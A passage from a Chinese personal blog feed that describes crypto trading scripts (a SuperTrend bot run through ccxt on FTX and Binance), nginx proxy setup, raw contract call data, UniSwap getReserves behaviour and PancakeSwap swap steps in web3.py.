去掉开头的0x字符串</span></span><br><span class="line">    full_price_hex_str = add_pre_zero(price_hex_str) <span class="comment"># 不足64位，前面补0</span></span><br><span class="line">    <span class="comment"># print(full_price_hex_str)</span></span><br><span class="line">    last_input_data = <span class="string">&quot;0x467f963d00000000000000000000000051353799f8550c9010a8b0cbfe6c02ca96e026e20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000012bb890508c125661e03b09ec06e404bc9289040&#123;&#125;00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">            full_price_hex_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> last_input_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造tx的参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tx_params</span>(<span class="params">self, to_address, input_data, gas</span>):</span><br><span class="line">    now_nonce = self.bsc_ins.w3.eth.get_transaction_count(self.wallet_addr)</span><br><span class="line">    to_address = Web3.toChecksumAddress(to_address)</span><br><span class="line">    tx_params = &#123;</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: now_nonce,</span><br><span class="line">        <span class="string">&#x27;to&#x27;</span>: to_address,</span><br><span class="line">        <span class="string">&#x27;value&#x27;</span>: self.bsc_ins.w3.toWei(<span class="number">0</span>, <span class="string">&#x27;ether&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;gas&#x27;</span>: gas,</span><br><span class="line">        <span class="string">&#x27;gasPrice&#x27;</span>: self.bsc_ins.w3.toWei(<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;gwei&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;data&#x27;</span>: input_data, <span class="comment"># here</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tx_params</span><br></pre></td></tr></table></figure>

<p>将tx用私钥签名，广播交易就可以了。<br>然后检测对应账户里的raca数量就可以知道有没卖出成功。</p>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><ol>
<li>data的组成规则：前八位为方法名以及参数类型的hash，hash往后64位进行分割，每一段就是方法的参数，不足64前面补零凑64位</li>
<li>多找相关的tx比较，找规律</li>
</ol>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://xz.aliyun.com/t/6900">如何与无源码的智能合约交互</a></li>
<li><a href="https://learnblockchain.cn/2018/08/09/understand-abi">如何理解以太坊ABI - 应用程序二进制接口</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1328286">深入以太坊智能合约 ABI</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-SuperTrend指标_合约交易脚本</title>
    <url>//14610.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>上一篇是去购买现货,回测几次后，发现效果还不错，由于定量设置了止盈率，挂好了<code>limit sell order</code>后,在短期拉盘的时候，能卖得出去。</p>
<p>想起之前看的<a href="https://tokentax.co/blog/best-crypto-trading-bot/">The Best Crypto Trading Bots On the Market | TokenTax</a></p>
<blockquote>
<p>crypto trading bots enable trading based on data and trends—not on emotional impulse</p>
<p>Ultimately, this usually grows their profits, minimizes their risks, and limits their losses across exchanges. </p>
<p>Furthermore, bots can produce passive income 24 hours a day. Whether you’re sleeping, biking, giving a presentation, whatever: you could also be earning from automated trades.</p>
</blockquote>
<p>通过策略写机器人来做交易,算是有严格的纪律性了，由数据驱动，不受情绪的影响。<br>另外一个好处就是，不用去盯盘。</p>
<p>这次拿来做合约交易</p>
<hr>
<h1 id="策略"><a href="#策略" class="headerlink" title="策略:"></a>策略:</h1><ul>
<li>选择一个我认为比较好的投资标的(币):<code>BNB</code></li>
<li>选择一个交易周期:45mins</li>
<li>Buy信号发出,很可能处于上涨行情,执行市价买入,5倍杠杠</li>
<li>设置收益率5%,执行限价卖出</li>
<li>以上每一步都设置tg提醒，入库记录</li>
<li>暂不设置止损，5倍杠杠，币种暴跌20%可能会爆仓</li>
</ul>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果:"></a>效果:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C83CAF70-1EA0-4882-AF5E-2697664AB1B7.png" alt="C83CAF70-1EA0-4882-AF5E-2697664AB1B7"></p>
<hr>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题:"></a>遇到的问题:</h1><h2 id="创建订单"><a href="#创建订单" class="headerlink" title="创建订单:"></a>创建订单:</h2><p>之前用的交易所是<code>binance</code>,这次用的是<code>ftx</code><br>通过ccxt在创建ftx limit sell order的时候花费比较多时间,参考<a href="https://github.com/ccxt/ccxt/issues/6740">Unable To create Limit orders on FTX</a>,才知道需要哪些参数.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cex_api.create_future_order(token_pair=<span class="string">&#x27;CAKE-PERP&#x27;</span>, <span class="built_in">type</span>=<span class="string">&quot;takeProfit&quot;</span>, side=<span class="string">&quot;sell&quot;</span>, amount=<span class="number">1</span>, price=<span class="number">20.32</span>, params=&#123;<span class="string">&#x27;triggerPrice&#x27;</span>: <span class="number">20.32</span>,<span class="string">&#x27;reduceOnly&#x27;</span>: <span class="literal">True</span>&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="返回的订单内容"><a href="#返回的订单内容" class="headerlink" title="返回的订单内容:"></a>返回的订单内容:</h2><p>同样是执行<code>market buy order</code>，<code>binance</code>和<code>ftx</code>返回的内容不一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># binance</span><br><span class="line">order = &#123;</span><br><span class="line">	&#x27;info&#x27;: &#123;</span><br><span class="line">		&#x27;symbol&#x27;: &#x27;CAKEUSDT&#x27;,</span><br><span class="line">		&#x27;orderId&#x27;: &#x27;253501445&#x27;,</span><br><span class="line">		&#x27;orderListId&#x27;: &#x27;-1&#x27;,</span><br><span class="line">		&#x27;clientOrderId&#x27;: &#x27;x-R4BD3S8213738c964e85cb662119c9&#x27;,</span><br><span class="line">		&#x27;transactTime&#x27;: &#x27;1630229168854&#x27;,</span><br><span class="line">		&#x27;price&#x27;: &#x27;0.00000000&#x27;,</span><br><span class="line">		&#x27;origQty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">		&#x27;executedQty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">		&#x27;cummulativeQuoteQty&#x27;: &#x27;12.77000000&#x27;,</span><br><span class="line">		&#x27;status&#x27;: &#x27;FILLED&#x27;,</span><br><span class="line">		&#x27;timeInForce&#x27;: &#x27;GTC&#x27;,</span><br><span class="line">		&#x27;type&#x27;: &#x27;MARKET&#x27;,</span><br><span class="line">		&#x27;side&#x27;: &#x27;BUY&#x27;,</span><br><span class="line">		&#x27;fills&#x27;: [&#123;</span><br><span class="line">			&#x27;price&#x27;: &#x27;25.54000000&#x27;,</span><br><span class="line">			&#x27;qty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">			&#x27;commission&#x27;: &#x27;0.00050000&#x27;,</span><br><span class="line">			&#x27;commissionAsset&#x27;: &#x27;CAKE&#x27;,</span><br><span class="line">			&#x27;tradeId&#x27;: &#x27;37608361&#x27;</span><br><span class="line">		&#125;]</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;id&#x27;: &#x27;253501445&#x27;,</span><br><span class="line">	&#x27;clientOrderId&#x27;: &#x27;x-R4BD3S8213738c964e85cb662119c9&#x27;,</span><br><span class="line">	&#x27;timestamp&#x27;: 1630229168854,</span><br><span class="line">	&#x27;datetime&#x27;: &#x27;2021-08-29T09:26:08.854Z&#x27;,</span><br><span class="line">	&#x27;lastTradeTimestamp&#x27;: None,</span><br><span class="line">	&#x27;symbol&#x27;: &#x27;CAKE/USDT&#x27;,</span><br><span class="line">	&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">	&#x27;timeInForce&#x27;: &#x27;GTC&#x27;,</span><br><span class="line">	&#x27;postOnly&#x27;: False,</span><br><span class="line">	&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">	&#x27;price&#x27;: 25.54,</span><br><span class="line">	&#x27;stopPrice&#x27;: None,</span><br><span class="line">	&#x27;amount&#x27;: 0.5,</span><br><span class="line">	&#x27;cost&#x27;: 12.77,</span><br><span class="line">	&#x27;average&#x27;: 25.54,</span><br><span class="line">	&#x27;filled&#x27;: 0.5,</span><br><span class="line">	&#x27;remaining&#x27;: 0.0,</span><br><span class="line">	&#x27;status&#x27;: &#x27;closed&#x27;,</span><br><span class="line">	&#x27;fee&#x27;: &#123;</span><br><span class="line">		&#x27;cost&#x27;: 0.0005,</span><br><span class="line">		&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;trades&#x27;: [&#123;</span><br><span class="line">		&#x27;info&#x27;: &#123;</span><br><span class="line">			&#x27;price&#x27;: &#x27;25.54000000&#x27;,</span><br><span class="line">			&#x27;qty&#x27;: &#x27;0.50000000&#x27;,</span><br><span class="line">			&#x27;commission&#x27;: &#x27;0.00050000&#x27;,</span><br><span class="line">			&#x27;commissionAsset&#x27;: &#x27;CAKE&#x27;,</span><br><span class="line">			&#x27;tradeId&#x27;: &#x27;37608361&#x27;</span><br><span class="line">		&#125;,</span><br><span class="line">		&#x27;timestamp&#x27;: None,</span><br><span class="line">		&#x27;datetime&#x27;: None,</span><br><span class="line">		&#x27;symbol&#x27;: &#x27;CAKE/USDT&#x27;,</span><br><span class="line">		&#x27;id&#x27;: None,</span><br><span class="line">		&#x27;order&#x27;: None,</span><br><span class="line">		&#x27;type&#x27;: None,</span><br><span class="line">		&#x27;side&#x27;: None,</span><br><span class="line">		&#x27;takerOrMaker&#x27;: None,</span><br><span class="line">		&#x27;price&#x27;: 25.54,</span><br><span class="line">		&#x27;amount&#x27;: 0.5,</span><br><span class="line">		&#x27;cost&#x27;: 12.77,</span><br><span class="line">		&#x27;fee&#x27;: &#123;</span><br><span class="line">			&#x27;cost&#x27;: 0.0005,</span><br><span class="line">			&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;],</span><br><span class="line">	&#x27;fees&#x27;: [&#123;</span><br><span class="line">		&#x27;cost&#x27;: 0.0005,</span><br><span class="line">		&#x27;currency&#x27;: &#x27;CAKE&#x27;</span><br><span class="line">	&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ftx</span><br><span class="line">&#123;</span><br><span class="line">	&#x27;info&#x27;: &#123;</span><br><span class="line">		&#x27;id&#x27;: &#x27;87609981695&#x27;,</span><br><span class="line">		&#x27;clientId&#x27;: None,</span><br><span class="line">		&#x27;market&#x27;: &#x27;BNB-PERP&#x27;,</span><br><span class="line">		&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">		&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">		&#x27;price&#x27;: None,</span><br><span class="line">		&#x27;size&#x27;: &#x27;0.1&#x27;,</span><br><span class="line">		&#x27;status&#x27;: &#x27;new&#x27;,</span><br><span class="line">		&#x27;filledSize&#x27;: &#x27;0.0&#x27;,</span><br><span class="line">		&#x27;remainingSize&#x27;: &#x27;0.1&#x27;,</span><br><span class="line">		&#x27;reduceOnly&#x27;: False,</span><br><span class="line">		&#x27;liquidation&#x27;: None,</span><br><span class="line">		&#x27;avgFillPrice&#x27;: None,</span><br><span class="line">		&#x27;postOnly&#x27;: False,</span><br><span class="line">		&#x27;ioc&#x27;: True,</span><br><span class="line">		&#x27;createdAt&#x27;: &#x27;2021-10-14T04:03:51.958018+00:00&#x27;,</span><br><span class="line">		&#x27;future&#x27;: &#x27;BNB-PERP&#x27;</span><br><span class="line">	&#125;,</span><br><span class="line">	&#x27;id&#x27;: &#x27;87609981695&#x27;,</span><br><span class="line">	&#x27;clientOrderId&#x27;: None,</span><br><span class="line">	&#x27;timestamp&#x27;: 1634184231958,</span><br><span class="line">	&#x27;datetime&#x27;: &#x27;2021-10-14T04:03:51.958Z&#x27;,</span><br><span class="line">	&#x27;lastTradeTimestamp&#x27;: None,</span><br><span class="line">	&#x27;symbol&#x27;: &#x27;BNB-PERP&#x27;,</span><br><span class="line">	&#x27;type&#x27;: &#x27;market&#x27;,</span><br><span class="line">	&#x27;timeInForce&#x27;: None,</span><br><span class="line">	&#x27;postOnly&#x27;: False,</span><br><span class="line">	&#x27;side&#x27;: &#x27;buy&#x27;,</span><br><span class="line">	&#x27;price&#x27;: None,</span><br><span class="line">	&#x27;stopPrice&#x27;: None,</span><br><span class="line">	&#x27;amount&#x27;: 0.1,</span><br><span class="line">	&#x27;cost&#x27;: None,</span><br><span class="line">	&#x27;average&#x27;: None,</span><br><span class="line">	&#x27;filled&#x27;: 0.0,</span><br><span class="line">	&#x27;remaining&#x27;: 0.1,</span><br><span class="line">	&#x27;status&#x27;: &#x27;open&#x27;,</span><br><span class="line">	&#x27;fee&#x27;: None,</span><br><span class="line">	&#x27;trades&#x27;: None</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://ccxt.readthedocs.io/en/latest/manual.html#orders">https://ccxt.readthedocs.io/en/latest/manual.html#orders</a></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014134717.png" alt="20211014134717"></p>
<p>看文档可知，尽量不要用info key里面的内容，这里面是交易所返回的原始内容，<code>ccxt</code>会解析然后放在其他一级的key，会更具通用性.</p>
<hr>
<h1 id="Nginx配置"><a href="#Nginx配置" class="headerlink" title="Nginx配置:"></a>Nginx配置:</h1><h2 id="查看配置文件路径"><a href="#查看配置文件路径" class="headerlink" title="查看配置文件路径:"></a>查看配置文件路径:</h2><p>使用<code>nginx</code>的<code>-t</code>参数进行配置检查，即可知道实际调用的配置文件路径及是否调用有效。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@foolisheddy ~]# nginx -t</span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf test is successful</span><br></pre></td></tr></table></figure>

<p>查看<code>/etc/nginx/nginx.conf </code>,可能包含了其他配置文件<code>include /etc/nginx/conf.d/*.conf;</code></p>
<h2 id="添加路由转发"><a href="#添加路由转发" class="headerlink" title="添加路由转发:"></a>添加路由转发:</h2><p>添加一段<code>location</code>,访问后转发到本地的flask api上。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /tradingview/ &#123;</span><br><span class="line">            proxy_pass       http://127.0.0.1:10086/tradingview;</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">            proxy_set_header Host $host;</span><br><span class="line">            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="nginx操作"><a href="#nginx操作" class="headerlink" title="nginx操作:"></a>nginx操作:</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看状态</span></span><br><span class="line">systemctl status nginx</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">systemctl restart nginx </span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug:"></a>Bug:</h1><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211014135626.png" alt="20211014135626"></p>
<p>tradingview会在有bug信号的时候，多次触发我的api</p>
<p>可能的解决方案:</p>
<ul>
<li>修改tradingview对应策略</li>
<li>发送信号设置</li>
<li>我这边手动处理</li>
</ul>
<p>暂时不处理，先记录一下</p>
<hr>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary:"></a>Summary:</h1><p>做合约交易的话，我自己还不是很有经验，可能后面经验增加or回测多次后能再优化策略吧。<br>3倍5倍低倍杠杠我理解成 借钱抄底 哈哈</p>
<p>有一些点后期可能需要优化:</p>
<ul>
<li>保证金</li>
<li>强平价</li>
<li>如何止损</li>
<li>仓位大小</li>
<li>消息面</li>
</ul>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://tokentax.co/blog/best-crypto-trading-bot/">The Best Crypto Trading Bots On the Market | TokenTax</a></li>
<li><a href="https://github.com/ccxt/ccxt/issues/6740">Unable To create Limit orders on FTX</a></li>
<li><a href="https://help.ftx.us/hc/en-us/articles/360043580173-Advanced-Order-Types">FTX 高级订单类型</a></li>
<li><a href="https://ccxt.readthedocs.io/en/latest/manual.html#orders">ccxt#orders</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-SuperTrend指标_现货交易脚本</title>
    <url>//48779.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>无意中看到这个<a href="https://youtu.be/yPQYHxwfC1g">视频</a>，有介绍到tradingview这个网站和SuperTrend这个指标,看起来还不错,尝试写个简单的交易脚本试试水。</p>
<hr>
<h1 id="SuperTrend指标"><a href="#SuperTrend指标" class="headerlink" title="SuperTrend指标:"></a>SuperTrend指标:</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介:"></a>简介:</h2><p>SuperTrend指标主要用于为投资者提供价格上涨或下跌的范围</p>
<p>该指标中当产品价格位于绿色线上方时，认为价格处于上涨行情中；</p>
<p>当价格位于红色线下方时，则认为当前的价格处于下跌行情</p>
<blockquote>
<p>简单的说,会给出<code>Buy</code>或者<code>Sell</code>信号</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/8ECBDBBC-A854-461F-A069-7A54DFE82690.png" alt="8ECBDBBC-A854-461F-A069-7A54DFE82690"></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p><strong>原理是判断收盘价是否突破ATR通道（通道 &#x3D; 均价上下n倍ATR）</strong></p>
<blockquote>
<p>Todo:还未完全理解hhh，后续补补</p>
</blockquote>
<h2 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解:"></a>我的理解:</h2><hr>
<h3 id="是否可以按照信号进行交易"><a href="#是否可以按照信号进行交易" class="headerlink" title="是否可以按照信号进行交易?"></a>是否可以按照信号进行交易?</h3><blockquote>
<p><strong>一般来说，这个指标不用于判断进场信号，但买入价位可以在绿线上方寻找，而卖出价位则可以在红线下方寻找。</strong></p>
</blockquote>
<p>如果严格按照<code>Buy</code>或者<code>Sell</code>信号去执行交易的话,效果可能不会很好。</p>
<p>很有可能会在相邻的信号时，<code>Buy</code>信号的价格比<code>Sell</code>信号要高</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/5DC72757-B5E7-4E13-B371-10A557367EE9.png" alt="5DC72757-B5E7-4E13-B371-10A557367EE9"></p>
<p>例如发送了<code>Buy</code>信号,最理想的情况当然是连续的Green的K棒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/C1843CAA-777B-46DD-B03E-8647D9D13C73.png" alt="C1843CAA-777B-46DD-B03E-8647D9D13C73"></p>
<p>也有可能,随后就遇到红色的K棒</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/6F4D976F-F12B-473A-A6AC-B9DE5ED5A83B.png" alt="6F4D976F-F12B-473A-A6AC-B9DE5ED5A83B"></p>
<p>所以嘛,指标只能作为参考,当然也和你的交易周期有关(看K棒的周期)。</p>
<hr>
<h3 id="信号发送频率"><a href="#信号发送频率" class="headerlink" title="信号发送频率?"></a>信号发送频率?</h3><p>跟你看线设置的周期有关:</p>
<p>如果设置<code>1分钟</code>,那么信号频率会很高,可能几分钟就一次</p>
<p>如果设置<code>4小时</code>,那么信号频率会很低,可能要好几天一次,胜率可能会高很多。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/D7DB9AF1-26AC-4D78-B645-701E5B39024B.png" alt="D7DB9AF1-26AC-4D78-B645-701E5B39024B"></p>
<hr>
<h1 id="交易脚本"><a href="#交易脚本" class="headerlink" title="交易脚本:"></a>交易脚本:</h1><h2 id="策略"><a href="#策略" class="headerlink" title="策略:"></a>策略:</h2><ul>
<li>选择一个交易周期:45mins</li>
<li><code>Buy</code>信号发出,很可能处于上涨行情,执行市价买入</li>
<li>设置收益率5%,执行限价卖出</li>
<li>暂不设置止损,选择一个我认为比较好的投资标的(币):<code>cake</code>，如果卖不出就让它套着</li>
<li>比较适合小熊行情，这样就算被套住，也成本不高</li>
</ul>
<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图:"></a>流程图:</h2><p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/5CFD73E4-C26C-41D5-9635-68A71FBBB2B9.png" alt="5CFD73E4-C26C-41D5-9635-68A71FBBB2B9"></p>
<ul>
<li>自己提供一个api,由tradingview进行发送<code>Buy</code>信号触发</li>
<li>触发后,市价买入x数量的币</li>
<li>设置一个止盈收益率为5%限价卖单</li>
<li>另外脚本监控限价卖单是否成功卖出</li>
<li>以上每一步都设置tg提醒，入库记录</li>
<li>暂不设置止损</li>
</ul>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果:"></a>效果:</h2><p>tradingview设置alert,设置webhook</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20210926131021.png" alt="20210926131021"></p>
<p>市价买入:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/AB2C4958-CB89-42EB-A5CF-89826075AEE7.png" alt="AB2C4958-CB89-42EB-A5CF-89826075AEE7"></p>
<p>限价卖出:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/08095169-9D4A-493F-B992-697B6F3E56CB.png" alt="08095169-9D4A-493F-B992-697B6F3E56CB"></p>
<h2 id="Todo"><a href="#Todo" class="headerlink" title="Todo:"></a>Todo:</h2><p>目前是初步尝试,跑一个月看看，后面再持续优化一下以下几个参数</p>
<ul>
<li>仓位</li>
<li>交易周期</li>
<li>止盈收益率</li>
</ul>
<hr>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://zhuanlan.zhihu.com/p/145064506">SuperTrend V.1 超级趋势线系统</a></li>
<li><a href="https://www.laohuiyou.com/baike/970.html">外汇技术指标：SuperTrend指标</a></li>
<li><a href="https://tw.tradingview.com/">https://tw.tradingview.com/</a></li>
<li><a href="https://youtu.be/yPQYHxwfC1g">https://youtu.be/yPQYHxwfC1g</a></li>
</ul>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-UniSwap_getReserves获取储备量</title>
    <url>//15785.html</url>
    <content><![CDATA[<h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p>简单过一下uniswap的Pair合约的内容，主要了解清楚getReserves函数。</p>
<h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><p>根据文档简单过一遍</p>
<p><strong>Event:</strong></p>
<ul>
<li>Mint 创造流动性token时触发</li>
<li>Burn 销毁流动性token时触发</li>
<li>Swap 交换时触发</li>
<li>Sync 储备量被更新时(mint、burn、swap、sync)触发</li>
</ul>
<p><strong>Read-Only Functions:</strong></p>
<ul>
<li>MINIMUM_LIQUIDITY 常量值1000</li>
<li>factory 返回工厂地址</li>
<li>token0 排序较低的token地址</li>
<li>token1 排序较高的token地址</li>
<li>getReserves 返回token0和token1的储备量，用于交易或分配流动性</li>
<li>price0CumulativeLast</li>
<li>price1CumulativeLast</li>
<li>kLast</li>
</ul>
<p><strong>State-Changing Functions:</strong></p>
<ul>
<li>mint 创建token</li>
<li>burn 销毁</li>
<li>swap 交换</li>
<li>skim</li>
<li>sync 同步</li>
</ul>
<h1 id="getReserves获取储备量"><a href="#getReserves获取储备量" class="headerlink" title="getReserves获取储备量"></a>getReserves获取储备量</h1><p>getReserves</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">getReserves</span>(<span class="params"></span>) external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);</span><br></pre></td></tr></table></figure>
<p>Returns the reserves of token0 and token1 used to price trades and distribute liquidity. See Pricing.<br>Also returns the block.timestamp (mod 2**32) of the last block during which an interaction occured for the pair.</p>
<p>主要是返回Pair里token0和token1的储备量</p>
<h1 id="token0-amp-token1"><a href="#token0-amp-token1" class="headerlink" title="token0 &amp; token1"></a>token0 &amp; token1</h1><p>token0</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">token0</span>(<span class="params"></span>) external view returns (address);</span><br></pre></td></tr></table></figure>
<p>Returns the address of the pair token with the lower sort order.</p>
<p>token1</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">token1</span>(<span class="params"></span>) external view returns (address);</span><br></pre></td></tr></table></figure>
<p>Returns the address of the pair token with the higher sort order.</p>
<p>可以在pair的合约里查到token0和token1分别的address</p>
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220525153407.png" width="50%" height="50%" />

<h1 id="测试储备量的变化："><a href="#测试储备量的变化：" class="headerlink" title="测试储备量的变化："></a>测试储备量的变化：</h1><h2 id="AddLiquidity"><a href="#AddLiquidity" class="headerlink" title="AddLiquidity:"></a>AddLiquidity:</h2><p>在添加流动性之前，查询结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  5462692571130940(0.00546269257113094) USDT</span><br><span class="line">&gt;  _reserve1   uint112 :  5383891113691435(0.005383891113691435) Token</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220525153952.png" width="50%" height="50%" />

<p>分别添加流动性，各10个后，pair里的储备量结果发生变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  10151827943605108889(10.151827943605108889) USDT ↑</span><br><span class="line">&gt;  _reserve1   uint112 :  10005383891113691435(10.005383891113691435) Token ↑</span><br></pre></td></tr></table></figure>

<h2 id="Sell："><a href="#Sell：" class="headerlink" title="Sell："></a>Sell：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  10151827943605108889(10.151827943605108889) USDT</span><br><span class="line">&gt;  _reserve1   uint112 :  10005383891113691435(10.005383891113691435) Token</span><br></pre></td></tr></table></figure>

<p>token卖成USDT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;  _reserve0   uint112 :  9669575752865546229(9.669575752865546229) USDT ↓</span><br><span class="line">&gt;  _reserve1   uint112 :  10505383891113691435(10.505383891113691435) Token ↑</span><br></pre></td></tr></table></figure>

<p>token传进pair，token储备量增加<br>pair流出USDT，USDT储备量减少</p>
<h2 id="Buy"><a href="#Buy" class="headerlink" title="Buy:"></a>Buy:</h2><p>与Sell行为相反，USDT ↑、Token↓</p>
<table>
<thead>
<tr>
<th>行为</th>
<th>token0储备量（USDT）</th>
<th>token1储备量（Token）</th>
</tr>
</thead>
<tbody><tr>
<td>Buy</td>
<td>↑</td>
<td>↓</td>
</tr>
<tr>
<td>Sell</td>
<td>↓</td>
<td>↑</td>
</tr>
<tr>
<td>AddLiquidity</td>
<td>↑</td>
<td>↑</td>
</tr>
<tr>
<td>RemoveLiquidity</td>
<td>↓</td>
<td>↓</td>
</tr>
</tbody></table>
<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
<li><a href="https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair">uniswap doc</a></li>
<li><a href="https://pancake.kiemtienonline360.com/#/swap">pancake swap测试网</a></li>
</ul>
]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>Crypto-pancakeswap_receipt细节</title>
    <url>//35176.html</url>
    <content><![CDATA[<h1 id="swap-token"><a href="#swap-token" class="headerlink" title="swap token:"></a>swap token:</h1><p>测试用<code>BNB</code>去购买<code>VRT</code></p>
<h2 id="代码步骤"><a href="#代码步骤" class="headerlink" title="代码步骤:"></a>代码步骤:</h2><p>执行一段完整的交易，代码需要进行几个步骤:</p>
<ol>
<li><strong>swapExactETHForTokens</strong> 传参，构造好函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">func = router_contract.functions.swapExactETHForTokens(min_output_tokens, [self.addr.wbnb, token_address], self.wallet, self.deadline(<span class="number">60</span>))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>buildTransaction</strong> 构造好交易</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">transaction = func.buildTransaction(tx_params)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>sign_transaction</strong> 私钥进行签名</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">signed_tx = self.w3.eth.account.sign_transaction(transaction, private_key=self.secret_key)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li><strong>send_raw_transaction</strong> 广播交易</li>
</ol>
